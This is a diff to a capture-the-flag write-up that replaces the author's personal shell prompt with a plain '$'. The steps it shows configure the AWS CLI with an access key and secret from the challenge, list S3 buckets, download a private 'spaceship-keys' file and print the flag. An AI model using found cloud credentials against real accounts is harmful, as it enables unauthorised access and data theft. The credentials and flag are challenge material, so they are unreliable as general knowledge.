@@ -51,7 +51,7 @@ So the AWS Access Key ID and Secret Access Key are credentials for an AWS accoun
 
 Once installed, we configure AWS CLI with these credentials. Using `--profile` helps to distinguish between different credentials.
 ```bash
-piyagehi@Piyas-MacBook-Pro:~$ aws configure --profile=locked-out
+$ aws configure --profile=locked-out
 AWS Access Key ID [None]: AKIAQD6AU4VDTDJRGXRE
 AWS Secret Access Key [None]: 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
 Default region name [None]: eu-west-1
@@ -60,18 +60,18 @@ Default output format [None]:
 
 Listing all buckets reveals an internal storage bucket, which contains a keys text file.
 ```bash
-piyagehi@Piyas-MacBook-Pro:~$ aws s3 ls --profile=locked-out
+$ aws s3 ls --profile=locked-out
 2021-06-24 19:36:05 external-spaceship-storage-b38e8c6
 2021-06-24 19:35:27 internal-spaceship-storage-fdde98f
-piyagehi@Piyas-MacBook-Pro:~$ aws s3 ls internal-spaceship-storage-fdde98f --profile=locked-out
+$ aws s3 ls internal-spaceship-storage-fdde98f --profile=locked-out
 2021-06-24 19:35:33 25 spaceship-keys
 ```
 
 Downloading and viewing the file reveals the flag for this sub challenge
 ```bash
-piyagehi@Piyas-MacBook-Pro:~$ aws s3 cp s3://internal-spaceship-storage-fdde98f/spaceship-keys . --profile=locked-out
+$ aws s3 cp s3://internal-spaceship-storage-fdde98f/spaceship-keys . --profile=locked-out
 download: s3://internal-spaceshipstoragefdde98f/spaceship-keys to ./spaceship-keys
-piyagehi@Piyas-MacBook-Pro:~$ cat spaceship-keys 
+$ cat spaceship-keys 
 CTF{4ababede5580d9a22a2a}
 ```
 
